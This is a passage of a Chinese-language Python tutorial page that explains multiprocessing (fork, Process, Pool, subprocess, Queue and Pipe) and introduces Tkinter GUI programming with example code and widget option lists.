    print('我 (%s) 创建的子进程ID为 (%s).' % (os.getpid(), pid))
print('进程结束:%s' % os.getpid())

'''
父进程(37)开始执行
进程进入:37
我 (37) 创建的子进程ID为 (38).
进程结束:37
进程进入:38
子进程,其ID为 (38),父进程ID为 (37)
进程结束:38
'''

</textarea><pre>
【 Process创建进程的2种方法 】
虽然使用os.fork()方法可以启动多个进程,但这种方式显然不适合Windows,而Python是跨平台的语言,所以Python绝不能仅仅局限于Windows系统,因此Python也提供了其他方式在Windows下创建新进程。

multiprocessing模块就是跨平台版本的多进程模块,multiprocessing模块提供了Process类来创建新进程对象。与Thread类似的是,使用Process创建新进程也有两种方式:
1、以指定函数作为target,创建Process对象即可创建新进程。
创建子进程时,只需要传入一个执行函数和函数的参数,创建一个Process实例,用start()方法启动,这样创建进程比fork()还要简单。
join()方法可以等待子进程结束后再继续往下运行,通常用于进程间的同步

2、继承Process类,并重写它的run()方法来创建进程类,程序创建Process子类的实例作为进程。
继承Process类创建子进程的步骤如下:
1、定义继承Process的子类,重写其run()方法准备作为进程执行体。
2、创建Process子类的实例。
3、调用Process子类的实例的start()方法来启动进程。

Process类也有如下类似的方法和属性:
run():重写该方法可实现进程的执行体。
start():该方法用于启动进程。
join([timeout]):该方法类似于线程的join()方法,当前进程必须等待被join的进程执行完成才能向下执行。
name:该属性用于设置或访问进程的名字。
is_alive():判断进程是否还活着。
daemon:该属性用于判断或设置进程的后台状态。
pid:返回进程的ID。
authkey:返回进程的授权key。
terminate():中断该进程。

</pre>以指定函数作为target来创建新进程<textarea>
import multiprocessing
import os

# 定义一个普通的action函数,该函数准备作为进程执行体
def action(max):
    for i in range(max):
        print("(%s)子进程(父进程:(%s)):%d" %
            (os.getpid(), os.getppid(), i))

# 通过multiprocessing.Process来创建并启动进程时,程序必须先判断if __name__=='__main__':,否则可能引发异常
if __name__ == '__main__':
    # 下面是主程序(也就是主进程)
    for i in range(100):
        print("(%s)主进程: %d" % (os.getpid(), i))
        if i == 20:
            # 创建并启动第一个进程
            mp1 = multiprocessing.Process(target=action,args=(100,))
            mp1.start()
            # 创建并启动第一个进程
            mp2 = multiprocessing.Process(target=action,args=(100,))
            mp2.start()
            mp2.join()  # 程序中调用了mp2.join(),因此主进程必须等mp2进程完成后才能向下执行
    print('主进程执行完成!')

</textarea>启动一个子进程并等待其结束<textarea>
from multiprocessing import Process
import os

# 子进程要执行的代码
def run_proc(name):
    print('Run child process %s (%s)...' % (name, os.getpid()))

if __name__=='__main__':
    print('Parent process %s.' % os.getpid())
    p = Process(target=run_proc, args=('test',))
    print('Child process will start.')
    p.start()
    p.join()
    print('Child process end.')

# 执行结果:
Parent process 928.
Process will start.
Run child process test (929)...
Process end.

</textarea>通过继承Process类来创建子进程<textarea>
import multiprocessing
import os

class MyProcess(multiprocessing.Process):
    def __init__(self, max):
        self.max = max
        super().__init__()
    # 重写run()方法作为进程执行体
    def run(self):
        for i in range(self.max):
            print("(%s)子进程(父进程:(%s)):%d" %
                (os.getpid(), os.getppid(), i))

if __name__ == '__main__':
    # 下面是主程序(也就是主进程)
    for i in range(100):
        print("(%s)主进程: %d" % (os.getpid(), i))
        if i == 20:
            # 创建并启动第一个进程
            mp1 = MyProcess(100)
            mp1.start()
            # 创建并启动第一个进程
            mp2 = MyProcess(100)
            mp2.start()
            mp2.join()
    print('主进程执行完成!')

</textarea><pre>
【 python设置进程启动的2种方式 】
根据平台的支持,Python 支持三种启动进程的方式:

1) spawn
父进程会启动一个全新的Python解释器进程。在这种方式下,子进程只能继承那些处理run()方法所必需的资源。典型的,那些不必要的文件描述器和handle都不会被继承。使用这种方式来启动进程,其效率比使用fork或forkserver方式要低得多。
Windows只支持spawn方式来启动进程,因此在Windows平台上默认使用这种方式来启动进程。

2) fork
父进程使用os.fork()来启动一个Python解释器进程。在这种方式下,子进程会继承父进程的所有资源,因此子进程基本等效于父进程。这种方式只在UNIX平台上有效,UNIX平台默认使用这种方式来启动进程。

3) forkserver
如果使用这种方式来启动进程,程序将会启动一个服务器进程。在以后的时间内,当程序再次请求启动新进程时,父进程都会连接到该服务器进程,请求由服务器进程来fork新进程。通过这种方式启动的进程不需要从父进程继承资源。这种方式只在UNIX平台上有效。

multiprocessing模块提供了一个set_start_method()函数,该函数可用于设置启动进程的方式,必须将这行设置代码放在所有与多进程有关的代码之前

</pre><textarea>
import multiprocessing
import os

def foo(q):
    print('被启动的新进程: (%s)' % os.getpid())
    # 新进程向multiprocessing.Queue中放入一个字符串数据
    q.put('Python')

if __name__ == '__main__':
    # 设置使用fork方式启动进程
    multiprocessing.set_start_method('spawn')
    q = multiprocessing.Queue()
    # 创建进程
    mp = multiprocessing.Process(target=foo, args=(q, ))
    # 启动进程
    mp.start()
    # 主进程获取队列中的消息
    print(q.get())
    mp.join()

</textarea>还有一种设置进程启动方式的方法,就是利用get_context()方法来获取Context对象,调用该方法时可传入spawn、fork或forkserver字符串。Context拥有和multiprocessing相同的API,因此程序可通过Context来创建并启动进程<textarea>
import multiprocessing
import os

def foo(q):
    print('被启动的新进程: (%s)' % os.getpid())
    q.put('Python')

if __name__ == '__main__':
    # 设置使用fork方式启动进程,并获取Context对象
    ctx = multiprocessing.get_context('fork')
    # 接下来就可用Context对象来代替mutliprocessing模块了
    q = ctx.Queue()
    # 创建进程
    mp = ctx.Process(target=foo, args=(q, ))
    # 启动进程
    mp.start()
    # 获取队列中的消息
    print(q.get())
    mp.join()

</textarea><pre>
【 Pool 】
与线程池类似的是,如果程序需要启动多个进程,也可以使用进程池来管理进程。程序可以通过multiprocessing模块的Pool()函数创建进程池,进程池实际上是multiprocessing.pool.Pool类。

进程池具有如下常用方法:
apply(func[, args[, kwds]])
将func函数提交给进程池处理。其中args代表传给func的位置参数,kwds代表传给func的关键字参数。该方法会被阻塞直到func函数执行完成。

apply_async(func[, args[, kwds[, callback[, error_callback]]]])
这是apply()方法的异步版本,该方法不会被阻塞。其中callback指定func函数完成后的回调函数,error_callback指定func函数出错后的回调函数。

map(func, iterable[, chunksize])
类似于Python的map()全局函数,只不过此处使用新进程对iterable的每一个元素执行func函数。

map_async(func, iterable[, chunksize[, callback[, error_callback]]])
这是map()方法的异步版本,该方法不会被阻塞。其中callback指定func函数完成后的回调函数,error_callback指定func函数出错后的回调函数。

imap(func, iterable[, chunksize])
这是map()方法的延迟版本。

imap_unordered(func, iterable[, chunksize])
功能类似于imap()方法,但该方法不能保证所生成的结果(包含多个元素)与原iterable中的元素顺序一致。

starmap(func, iterable[,chunksize])
功能类似于map()方法,但该方法要求iterable的元素也是iterable对象,程序会将每一个元素解包之后作为func函数的参数。

close()
关闭进程池。在调用该方法之后,该进程池不能再接收新任务,它会把当前进程池中的所有任务执行完成后再关闭自己。

terminate()
立即中止进程池。

join()
等待所有进程完成。

如果程序只是想将任务提交给进程池执行则可调用apply()或apply_async()方法
如果程序需要使用指定函数将iterable转换成其他iterable则可使用map()或imap()方法

对Pool对象调用join()方法会等待所有子进程执行完毕,调用join()之前必须先调用close(),调用close()之后就不能继续添加新的Process了
Pool的默认大小是CPU的核数

</pre><textarea>
from multiprocessing import Pool
import os, time, random

def long_time_task(name):
    print('RunTask%s (%s)...' % (name, os.getpid()))
    start = time.time()
    time.sleep(random.random() * 3)
    end = time.time()
    print('Task %s runs %0.2f seconds.' % (name, (end - start)))

if __name__=='__main__':
    print('Parent process %s.' % os.getpid())
    p = Pool(4)
    for i in range(5):
        p.apply_async(long_time_task, args=(i,))
    print('Waiting for all subprocesses done...')
    p.close()
    p.join()
    print('All subprocesses done.')

# 执行结果:task 0、1、2、3是立刻执行的,而task 4要等待前面某个task完成后才执行,这是因为Pool(4)最多同时执行4个进程
Parent process 669.
Waiting for all subprocesses done...
RunTask0 (671)...
RunTask1 (672)...
RunTask2 (673)...
RunTask3 (674)...
Task 2 runs 0.14 seconds.
RunTask4 (673)...
Task 1 runs 0.27 seconds.
Task 3 runs 0.86 seconds.
Task 0 runs 1.41 seconds.
Task 4 runs 1.91 seconds.
All subprocesses done.

</textarea>使用apply_async()方法启动进程<textarea>
import multiprocessing
import time
import os

def action(name='default'):
    print('(%s)进程正在执行,参数为: %s' % (os.getpid(), name))
    time.sleep(3)

if __name__ == '__main__':
    # 创建包含4条进程的进程池
    pool = multiprocessing.Pool(processes=4)
    # 将action分3次提交给进程池
    pool.apply_async(action)
    pool.apply_async(action, args=('位置参数', ))
    pool.apply_async(action, kwds={'name': '关键字参数'})
    pool.close()
    pool.join()

</textarea>进程池同样实现了上下文管理协议,因此程序可以使用with子句来管理进程池,这样就可以避免程序主动关闭进程池<textarea>
import multiprocessing
import time
import os
# 定义一个准备作为进程任务的函数
def action(max):
    my_sum = 0
    for i in range(max):
        print('(%s)进程正在执行: %d' % (os.getpid(), i))
        my_sum += i
    return my_sum
if __name__ == '__main__':
    # 创建一个包含4条进程的进程池
    with multiprocessing.Pool(processes=4) as pool:
        # 使用map()方法来启动进程,使用进程执行map计算,后面元组有3个元素,因此程序启动3条进程来执行action函数
        results = pool.map(action, (5, 10, 15))
        print('--------------')
        for r in results:
            print(r)

</textarea><pre>
【 子进程 】
很多时候子进程并不是自身,而是一个外部进程。创建了子进程后,还需要控制子进程的输入和输出。
subprocess模块可以非常方便地启动一个子进程,然后控制其输入和输出。

</pre>演示如何在Python代码中运行命令nslookup www.python.org,这和命令行直接运行的效果是一样的<textarea>
import subprocess

print('$ nslookup www.python.org')
r = subprocess.call(['nslookup', 'www.python.org'])
print('Exit code:', r)

# 运行结果:
$ nslookup www.python.org
Server:   192.168.19.4
Address:  192.168.19.4#53

Non-authoritative answer:
www.python.org  canonical name = python.map.fastly.net.
Name: python.map.fastly.net
Address: 199.27.79.223

Exit code: 0

</textarea>如果子进程还需要输入则可以通过communicate()方法输入<textarea>
import subprocess

print('$ nslookup')
p = subprocess.Popen(['nslookup'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
output, err = p.communicate(b'set q=mx\npython.org\nexit\n')
print(output.decode('utf-8'))
print('Exit code:', p.returncode)

# 上面的代码相当于在命令行执行命令nslookup,然后手动输入:
set q=mx
python.org
exit

# 运行结果如下:
$ nslookup
Server:   192.168.19.4
Address:  192.168.19.4#53

Non-authoritative answer:
python.org  mail exchanger = 50 mail.python.org.

Authoritative answers can be found from:
mail.python.org internet address = 82.94.164.166
mail.python.org has AAAA address 2001:888:2000:d::a6

Exit code: 0

</textarea><pre>
【 进程间通信的2种实现方法:Queue和Pipe 】
Process之间肯定是需要通信的,操作系统提供了很多机制来实现进程间的通信。Python的multiprocessing模块包装了底层的机制,提供了Queue、Pipes等多种方式来交换数据。

Python为进程通信提供了两种机制:
1、Queue:一个进程向Queue中放入数据,另一个进程从Queue中读取数据。
2、Pipe:Pipe代表连接两个进程的管道。程序在调用Pipe()函数时会产生两个连接端,分别交给通信的两个进程,接下来进程既可从该连接端读取数据,也可向该连接端写入数据。

使用Queue实现进程间通信
multiprocessing模块下的Queue和queue模块下的Queue基本类似,它们都提供了qsize()、empty()、full()、put()、put_nowait()、get()、get_nowait()等方法。区别只是multiprocessing模块下的Queue为进程提供服务,而queue模块下的Queue为线程提供服务

</pre>使用Queue来实现进程之间的通信,子进程负责向Queue中放入一个数据,父进程负责从Queue中读取一个数据,这样就实现了父、子两个进程之间的通信<textarea>
import multiprocessing

def f(q):
    print('(%s) 进程开始放入数据...' % multiprocessing.current_process().pid)
    q.put('Python')

if __name__ == '__main__':
    # 创建进程通信的Queue
    q = multiprocessing.Queue()
    # 创建子进程
    p = multiprocessing.Process(target=f, args=(q,))
    # 启动子进程
    p.start()
    print('(%s) 进程开始取出数据...' % multiprocessing.current_process().pid)
    # 取出数据
    print(q.get())  # Python
    p.join()

</textarea>以Queue为例,在父进程中创建两个子进程,一个往Queue里写数据,一个从Queue里读数据<textarea>
from multiprocessing import Process, Queue
import os, time, random

# 写数据进程执行的代码
def write(q):
    print('Process to write: %s' % os.getpid())
    for value in ['A', 'B', 'C']:
        print('Put %s to queue...' % value)
        q.put(value)
        time.sleep(random.random())

# 读数据进程执行的代码
def read(q):
    print('Process to read: %s' % os.getpid())
    while True:
        value = q.get(True)
        print('Get %sfromqueue.' % value)

if __name__=='__main__':
    # 父进程创建Queue,并传给各个子进程
    q = Queue()
    pw = Process(target=write, args=(q,))
    pr = Process(target=read, args=(q,))
    pw.start()       # 启动子进程pw,写入:
    pr.start()       # 启动子进程pr,读取:
    pw.join()        # 等待pw结束:
    pr.terminate()   # pr进程里是死循环,无法等待其结束,只能强行终止:

# 运行结果如下:
Process to write: 50563
Put A to queue...
Process to read: 50564
Get Afromqueue.
Put B to queue...
Get Bfromqueue.
Put C to queue...
Get Cfromqueue.

</textarea><pre>
使用Pipe实现进程间通信
使用Pipe实现进程通信,程序会调用multiprocessing.Pipe()函数来创建一个管道,该函数会返回两个PipeConnection对象,代表管道的两个连接端(一个管道有两个连接端,分别用于连接通信的两个进程)。

PipeConnection对象包含如下常用方法:
send(obj):发送一个obj给管道的另一端,另一端使用recv()方法接收,该obj必须是可picklable的(Python的序列化机制),如果该对象序列化之后超过32MB则很可能会引发ValueError异常
recv():接收另一端通过send()方法发送过来的数据。
fileno():关于连接所使用的文件描述器。
close():关闭连接。
poll([timeout]):返回连接中是否还有数据可以读取。
send_bytes(buffer[, offset[, size]]):发送字节数据。如果没有指定offset、size参数则默认发送buffer字节串的全部数据;如果指定了offset和size参数则只发送buffer字节串中从 offset开始、长度为size的字节数据。通过该方法发送的数据,应该使用recv_bytes()或recv_bytes_into方法接收。
recv_bytes([maxlength]):接收通过send_bytes()方法发迭的数据,maxlength指定最多接收的字节数。该方法返回接收到的字节数据。
recv_bytes_into(buffer[, offset]):功能与recv_bytes()方法类似,只是该方法将接收到的数据放在buffer中

</pre>使用Pipe来实现两个进程之间的通信<textarea>
import multiprocessing

def f(conn):
    print('(%s) 进程开始发送数据...' % multiprocessing.current_process().pid)
    # 子进程使用conn向父进程发送数据
    conn.send('Python')

if __name__ == '__main__':
    # 创建Pipe,该函数返回两个PipeConnection对象
    parent_conn, child_conn = multiprocessing.Pipe()
    # 创建子进程
    p = multiprocessing.Process(target=f, args=(child_conn, ))
    # 启动子进程
    p.start()
    print('(%s) 进程开始接收数据...' % multiprocessing.current_process().pid)
    # 主进程通过conn读取从子进程发送过来的数据
    print(parent_conn.recv())  # Python
    p.join()

</textarea>
</div>

<div id="gui">
<h3>Python GUI编程 图形界面开发 Tkinter</h3><pre>
Python GUI(Graphics User Interface)开发也叫Python图形界面开发,就是开发出带界面的客户端程序,像QQ、迅雷一样。

Python支持多种图形界面的第三方库:
1、Tkinter库
tkinter模块(支持Tk接口)是Python内置的标准Tk GUI工具包的接口,Tk和Tkinter可以在大多数的Unix平台下使用,同样可以应用在Windows和Macintosh系统里。Tk8.0的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。

2、wxPython
wxPython是一款开源软件,是Python语言的一套优秀的GUI图形库,允许Python程序员很方便的创建完整的、功能健全的GUI用户界面。
wxPython是一个跨平台的GUI工具集,以流行的wxWidgets(原名wxWindows)为基础,提供了良好的跨平台外观。简单来说,wxPython在Windows上调用 Windows的本地组件、在Mac OS上调用Mac OS X的本地组件、在Linux上调用Linux的本地组件,这样可以让GUI程序在不同的平台上显示平台对应的风格。wxPython是一个非常流行的跨平台的GUI库

3、Jython
Jython程序可以和Java无缝集成。除了一些标准模块,Jython使用Java的模块。Jython几乎拥有标准的Python中不依赖于C语言的全部模块。比如Jython的用户界面将使用Swing,AWT或SWT。Jython可以被动态或静态地编译成Java字节码。

4、PyQt
PyQt是Python编程语言和Qt库的成功融合。Qt本身是一个扩展的C++ GUI应用开发框架,Qt可以在UNIX、Windows和Mac OS X上完美运行,因此PyQt是建立在Qt基础上的Python包装。所以PyQt也能跨平台使用。

5、PyGTK
PyGTK基于老版本的GTK+2的库提供绑定,借助于底层GTK+2所提供的各种可视化元素和组件,同样可以开发出在GNOME桌面系统上运行的软件,因此它主要适用于Linux/UNIX系统。PyGTK对GTK+2的C语言进行了简单封装,提供了面向对象的编程接口

6、Pywin32
Windows Pywin32库允许像VC一样的形式使用Python开发win32应用。

7、Kivy
Kivy是一个开源库,它能够让使用相同源代码创建的程序实现跨平台运行。同时Kivy主要关注创新型用户界面开发,例如多点触摸应用程序。

8、Flexx
Flexx是一个纯Python工具包,可以用来创建图形化界面程序,还支持使用Web技术进行界面的渲染。

每个GUI库都有其优缺点,因此GUI库的选择取决于实现的应用场景。比如考虑开发跨平台的图形用户界面则推荐使用PyQt或wsPython。
Python内置的Tkinter可以满足基本的GUI程序的要求, 如果是非常复杂的GUI程序, 建议用操作系统原生支持的语言和库来编写

tkinter编程
tkinter是Python的标准GUI库,Python使用tkinter可以快速的创建GUI应用程序。
由于tkinter是内置到python的安装包中、只要安装好Python之后就能import tkinter库,而且IDLE也是用tkinter编写而成、对于简单的图形界面tkinter还是能应付自如。

编写的Python代码会调用内置的Tkinter,Tkinter封装了访问Tk的接口;
Tk是一个图形库,支持多个操作系统,使用Tcl语言开发;
Tk会调用操作系统提供的本地GUI接口,完成最终的GUI。
所以只需要调用Tkinter提供的接口就可以了

tkinter是Python调用tcl程序的标准Python程序,可以通过这个interface调用tcl的程序,因为在大多数的unix系统中都内置了很多的tcl程序和命令。
Tcl是"工具控制语言(Tool Command Language)"的缩写,其面向对象为otcl语言。Tk是Tcl"图形工具箱"的扩展,它提供各种标准的GUI接口项,以利于迅速进行高级应用程序开发。

Tkinter是Python标准GUI库,其最初是为Tcl工具命令语言设计的,由于其良好的可移植性和灵活性,加上非常容易使用,因此逐渐被移植到很多脚本语言中,包括Perl、Ruby和Python

任何窗口都可被分解成一个空的容器,容器里盛装了大量的基本组件,通过设置这些基本组件的大小、位置等属性就可以将该空的容器和基本组件组成一个整体的窗口。实际上图形界面编程非常简单,它非常类似于拼图游戏,容器类似于拼图的"母板",而普通组件如Button、Listbox之类的则类似于拼图的图块。创建图形用户界面的过程就是完成拼图的过程

Tkinter的GUI组件有两个根父类,它们都直接继承了object类：
Misc：它是所有组件的根父类。
Wm：它主要提供了一些与窗口管理器通信的功能函数。
对于Misc和Wm两个基类而言,GUI编程并不需要直接使用它们,但由于它们是所有GUI组件的父类,因此GUI组件都可以直接使用它们的方法。
Misc和Wm派生了一个子类Tk,它代表应用程序的主窗口,因此所有Tkinter GUI编程通常都需要直接或间接使用该窗口类。
BaseWidget是所有组件的基类,它还派生了一个子类Widget。Widget代表一个通用的GUI组件,Tkinter所有的GUI组件都是Widget的子类。
Widget一共有四个父类,除BaseWidget之外,还有Pack、Place和Grid这三个父类都是布局管理器,它们负责管理所包含的组件的大小和位置。
Widget的子类都是Tkinter GUI编程的各种UI组件,也就是各种"积木块"

GUI组件列表
Toplevel  顶层  容器类,可用于为其他组件提供单独的容器;Toplevel 有点类似于窗口
Button  按钮  代表按钮组件
Canvas  画布  提供绘图功能,包括绘制直线、矩形、椭圆、多边形、位图等
Checkbutton 复选框 可供用户勾选的复选框
Entry 单行输入框 用户可输入内容
Frame 容器  用于装载其它 GUI 组件
Label 标签  用于显示不可编辑的文本或图标
LabelFrame  容器  也是容器组件,类似于Frame,但它支持添加标题
Listbox 列表框 列出多个选项,供用户选择
Menu  菜单  菜单组件
Menubutton  菜单按钮  用来包含菜单的按钮(包括下拉式、层叠式等)
OptionMenu  菜单按钮  Menubutton 的子类,也代表菜单按钮,可通过按钮打开一个菜单
Message 消息框 类似于标签,但可以显示多行文本;后来当 Label 也能显示多行文本之后,该组件基本处于废弃状态
PanedWindow   分区窗口  该容器会被划分成多个区域,每添加一个组件占一个区域,用户可通过拖动分隔线来改变各区域的大小
Radiobutton 单选钮 可供用户点边的单选钮
Scale 滑动条 拖动滑块可设定起始值和结束值,可显示当前位置的精确值
Spinbox 微调选择器 用户可通过该组件的向上、向下箭头选择不同的值
Scrollbar 滚动条 用于为组件(文本域、画布、列表框、文本框)提供滚动功能
Text  多行文本框 显示多行文本

创建一个GUI程序
1、导入tkinter模块
2、创建控件
3、指定这个控件的master,即这个控件属于哪一个
4、告诉GM(geometry manager)有一个控件产生了

</pre>显示空的窗口<textarea>
import tkinter  # Python3.x版本使用的库名为tkinter
top = tkinter.Tk()
top.mainloop()  # 启用主窗口消息循环

</textarea><textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# 使用Tkinter前需要先导入
# Python 2.x使用这行
# from Tkinter import *
# Python 3.x使用这行
from tkinter import *

# 创建Tk对象,Tk代表顶级窗口
root = Tk()
# 设置窗口标题
root.title('窗口标题')
# 创建Label对象即文本标签,因此需要指定将该Label放在哪个容器内,第一个参数指定该Label放入root窗口内
w = Label(root, text="Hello Tkinter!")
# 调用pack进行布局
w.pack()
# 启动主窗口的消息循环
root.mainloop()

</textarea><textarea>
import tkinter as tk

window = tk.Tk()           # 实例化object,建立窗口window
window.title('My Window')  # 给窗口的可视化起名字
window.geometry('500x300') # 设定窗口的大小(长 * 宽),这里的乘是小x

# 在图形界面上设定标签,bg为背景,font为字体,width为长,height为高,这里的长和高是字符的长和高,如height=2就是标签有2个字符这么高
l = tk.Label(window, text='你好！this is Tkinter', bg='green', font=('Arial', 12), width=30, height=2)
# 放置标签,Label内容content区域放置位置,自动调节尺寸
l.pack()

# 启用主窗口消息循环,window.mainloop就会让window不断的刷新,如果没有mainloop就是一个静态的window,传入进去的值就不会有循环,mainloop就相当于一个很大的while循环,每点击一次就会更新一次,所以必须要有循环,所有的窗口文件都必须有类似的mainloop函数,mainloop是窗口文件的关键的关键。
window.mainloop()

</textarea>还有一种方式是不直接使用Tk,只要创建Frame的子类,它的子类就会自动创建Tk对象作为窗口<textarea>
from tkinter import *

class Application(Frame):                    # 定义继承Frame的Application类

    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.initWidgets()                   # 调用initWidgets()方法初始化界面

    def initWidgets(self):                   # 程序在initWidgets()方法中创建了两个组件即Label和Button
        w = Label(self)                      # 创建Label对象,第一个参数指定该Label放入root
        bm = PhotoImage(file = 'light.gif')  # 创建一个位图图片对象
        w.x = bm                             # 必须用一个不会被释放的变量引用该图片,否则PhotoImage对象可能会被系统回收该图片会被回收
        w['image'] = bm                      # 设置显示的图片是bm
        w.pack()
        okButton = Button(self, text="确定") # 创建Button对象,第一个参数指定该Button放入root
        okButton['background'] = 'yellow'
        okButton.pack()

# 创建Application对象,如果程序在创建任意Widget组件甚至Button时没有指定master属性(即创建Widget组件时第一个参数传入 None),那么程序会自动为该Widget组件创建一个Tk窗口,因此Python会自动为Application实例创建Tk对象来作为它的master
app = Application()
print(type(app.master))      # Frame有个默认的master属性,该属性值是Tk对象(窗口)
app.master.title('窗口标题')  # 通过master属性来设置窗口标题
app.mainloop()               # 启动主窗口的消息循环

</textarea><textarea>
import tkinter as tk

class App:
    def __init__(self, root):
        frame = tk.Frame(root)  # 创建一个框架, 然后在里面添加一个Button按钮组件,框架一般使用于在复杂的布局中起到将组建分组的作用
        frame.pack()
        self.hi_there = tk.Button(frame, text="打招呼", fg="blue", bg="red", command=self.say_hi) # 创建一个按钮组件
        self.hi_there.pack(side=tk.LEFT) # side参数可以设置LEFT,RIGHT,TOP和TOTTOM四个方位,默认设置是side=tkinter.TOP
    def say_hi(self):
        print("互联网的广大朋友们大家好, 我是初音未来!")

root = tk.Tk()   # 创建一个toplevel的根窗口, 并把他作为擦参数实例化APP对象
app = App(root)
root.mainloop()  # 启用主窗口消息循环

</textarea><textarea>
# 导入Tkinter包的所有内容
from tkinter import *

# 从Frame派生一个Application类, 这是所有Widget的父容器,在GUI中每个Button、Label、输入框等都是一个Widget。Frame则是可以容纳其他Widget的Widget, 所有的Widget组合起来就是一棵树
# pack()方法把Widget加入到父容器中, 并实现布局。pack()是最简单的布局, grid()可以实现更复杂的布局
class Application(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.createWidgets()

    def createWidgets(self):
        self.helloLabel = Label(self, text='Hello, world!')
        self.helloLabel.pack()
        self.quitButton = Button(self, text='Quit', command=self.quit)  # 当Button被点击时触发self.quit()使程序退出
        self.quitButton.pack()

# 实例化Application并启动消息循环,GUI程序的主线程负责监听来自操作系统的消息, 并依次处理每一条消息。因此如果消息处理非常耗时就需要在新线程中处理
app = Application()
app.master.title('Hello World')  # 设置窗口标题
app.mainloop()                   # 启用主窗口消息循环

# 再对这个GUI程序改进一下,加入一个文本框,让用户可以输入文本,然后点按钮后,弹出消息对话框
from tkinter import *
import tkinter.messagebox as messagebox

class Application(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.createWidgets()

    # 当用户点击按钮时触发hello(), 通过self.nameInput.get()获得用户输入的文本后, 使用tkMessageBox.showinfo()可以弹出消息对话框
    def createWidgets(self):
        self.nameInput = Entry(self)
        self.nameInput.pack()
        self.alertButton = Button(self, text='Hello', command=self.hello)
        self.alertButton.pack()

    def hello(self):
        name = self.nameInput.get() or 'world'
        messagebox.showinfo('Message', 'Hello, %s' % name)

app = Application()
app.master.title('Hello World')  # 设置窗口标题
app.mainloop()                   # 启用主窗口消息循环

</textarea><pre>
创建一个GUI程序流程：
1、创建GUI组件,相当于创建"积木块",与创建其他Python对象并没有任何区别,但通常至少要指定一个参数用于设置该GUI组件属于哪个容器,Tk组件例外,因为该组件代表顶级窗口
2、添加GUI组件,此处使用pack()方法添加,相当于把"积木块"添加进去。
3、配置GUI组件。

配置GUI组件的方法有以下2种：
1、以关键字参数的方式配置,如okButton = Button(self,text="确定",background='yellow'),其中text指定了该按钮上的文本
2、以字典语法进行配置,如okButton['background']='yellow'
3、okButton.configure(text = '确定')在创建按钮之后配置该按钮上的文本

GUI组件配置选项可以通过该组件的构造方法的帮助文档来查看,例如查看Button的构造方法的帮助文档,可以看到Button支持两组选项：标准选项(STANDARD OPTIONS)和组件特定选项(WIDGET-SPECIFIC OPTIONS)

</pre><textarea>
>>> help(tkinter.Button.__init__)
Help on function __init__ in module tkinter:

__init__(self, master=None, cnf={}, **kw)
    Construct a button widget with the parent MASTER.

    STANDARD OPTIONS
        activebackground, activeforeground, anchor,
        background, bitmap, borderwidth, cursor,
        disabledforeground, font, foreground
        highlightbackground, highlightcolor,
        highlightthickness, image, justify,
        padx, pady, relief, repeatdelay,
        repeatinterval, takefocus, text,
        textvariable, underline, wraplength

    WIDGET-SPECIFIC OPTIONS
        command, compound, default, height,
        overrelief, state, width

</textarea><pre>
GUI组件常见同一选项：
bitmap：指定在组件上显示该选项指定的位图,该选项值可以是Tk_GetBitmap接收的任何形式的位图。位图的显示方式受anchor、justify选项的影响。同时指定了bitmap和text则bitmap覆盖文本;同时指定了bitmap和image则image覆盖bitmap
image：指定组件中显示的图像,如果设置了image 选项,它将会覆盖text、bitmap选项,单位：image
anchor：指定组件内的信息如文本或图片在组件中如何显示,可选值：N、NE、E、SE、S、SW、W、NW或CENTER,如NW(NorthWest)指定将信息显示在组件的左上角,典型值：CENTER
text：指定组件上显示的文本,文本显示格式由组件本身、anchor及justify选项决定,单位:str,典型值:'确定'
textvariable：指定一个变量名,组件负责显示该变量值转换的字符串,文本显示格式由组件本身、anchor及justify选项决定,单位:variable,典型值:bnText
font：指定组件上显示的文本字体,单位:font,典型值:'Helvetica'或('Verdana', 8)
justify：指定组件内部内容的对齐方式,该选项支持LEFT(左对齐)、CENTER(居中对齐)或RIGHT(右对齐)这三个值,单位:constant,典型值:RIGHT
padx：指定组件内部在水平方向上两边的空白,该值可以是Tk_GctPixels接收的任何格式,单位:pixel,典型值:12
pady：指定组件内部在垂直方向上两地的空白,该值可以是Tk_GctPixels接收的任何格式,单位:pixel,典型值:12
width：指定组件的宽度,以font选项指定的字体的字符高度为单位,至少为1,单位:integer,典型值:14
height：指定组件的高度,以font选项指定的字体的字符高度为单位,至少为1,单位:integer,典型值:14
borderwidth：指定组件正常显示时的3D边框的宽度,该值可以是Tk_GetPixels接收的任何格式,单位:pixel,典型值:2
cursor：指定光标在组件上的样式。该值可以是Tk_GetCursors 接受的任何格式,单位:cursor,典型值:gumby
state：指定组件的当前状态。该选项支持NORMAL(正常)、DISABLE(禁用)这两个值,单位:constant,典型值:NORMAL
foreground(fg)：指定组件正常显示时的前景色,单位:color,典型值:'gray'或'#ff4400'
background(bg)：指定组件正常显示时的背景色,单位:color,典型值:'gray25'或'#ff4400'
activebackground：指定组件处于激活状态时的背景色,单位:color,典型值:'gray25'或'#ff4400'
activeforeground：指定组件处于激活状态时的前景色,单位:color,典型值:'gray25'或'#ff4400'
disabledforeground：指定组件处于禁用状态时的前景色,单位:color,典型值:'gray25'或'#ff4400'
highlightbackground：指定组件在高亮状态下的背景色,单位:color,典型值:'gray'或'#ff4400'
highlightcolor：指定组件在高亮状态下的前景色,单位:color,典型值:'gray'或'#ff4400'
highlightthickness：指定组件在高亮状态下的周围方形区域的宽度,该值可以是Tk_GetPixels接收的任何格式,单位:pixel,典型值:2
selectbackground：指定组件在选中状态下的背景色,单位:color,典型值:'gray'或'#ff4400'
selectborderwidth：指定组件在选中状态下的3D边框的宽度,该值可以是Tk_GetPixels接收的任何格式,单位:pixel,典型值:2
selectforeground：指定组在选中状态下的前景色,单位:color,典型值:'gray'或'#ff4400'
relief：指定组件的3D效果,该选项支持的值包括RAISED、SUNKEN、FLAT、RIDGE、SOLID、GROOVE。该值指出组件内部相对于外部的外观样式,比如RAISED表示组件内部相对于外部凸起,单位:constant,典型值:GROOVE RAISED
takefocus：指定组件在键盘遍历(Tab或Shift+Tab)时是否接收焦点,将该选项设为1表示接收焦点;设为0表示不接收焦点,单位:boolean,典型值:1或YES
underline：指定为组件文本的第几个字符添加下画线,该选项就相当于为组件绑定了快捷键,单位:integer,典型值:2
